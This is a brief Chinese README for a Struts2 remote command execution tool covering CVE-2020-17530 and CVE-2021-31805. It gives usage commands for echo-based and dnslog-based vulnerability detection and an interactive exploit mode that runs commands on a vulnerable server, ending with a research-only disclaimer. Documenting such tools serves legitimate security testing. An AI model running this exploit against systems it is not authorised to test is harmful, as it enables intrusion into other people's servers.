# CVE-2021-31805

# 1.简介

Struts2 远程命令执行漏洞（CVE-2020-17530&CVE-2021-31805）POC&amp;EXP

# 2.用法

+ 参数介绍
```
-u 目标url
-m [dnslog|exp] //默认有回显界面字符检查
-n [s2-062] //默认s2-061
-s [windows] //默认linux
-p 漏洞参数
```

+ 有回显检测
```
Struts2RCE -u http://127.0.0.1:8080 //默认s2-061检测
```
![image](https://user-images.githubusercontent.com/108780847/180611148-c10e9c1d-77ec-451b-959e-9d55561b46f4.png)

+ 无回显检测
```
请自行注册ceye，并配置好ceye.ini
Struts2RCE -u http://127.0.0.1:8080 -m dnslog -n s2-062 //s2-062 dnslog检测,检测速度跟网络和ceye服务器有关，不同url需要清除dnslog记录，否则会造成误判。
```
![image](https://user-images.githubusercontent.com/108780847/178152997-0aae3127-7249-46f8-ae09-b05d8384d52e.png)
![image](https://user-images.githubusercontent.com/108780847/180611370-e16bc8a0-410a-45f6-ab69-eb38102968da.png)

+ EXP

```
存在漏洞情况下，可直接输入漏洞参数进行验证
Struts2RCE -u http://127.0.0.1:8080 -m exp -p id //s2-061漏洞，参数为id的验证，输入q退出
```
![image](https://user-images.githubusercontent.com/108780847/180611459-d6d18230-4bb3-442a-a1d0-6385b55c4539.png)

# 3.免责声明

此工具仅用于学习、研究和自查。
不应用于非法目的，请遵守相关法律法规。
使用本工具产生的任何风险与本人无关！
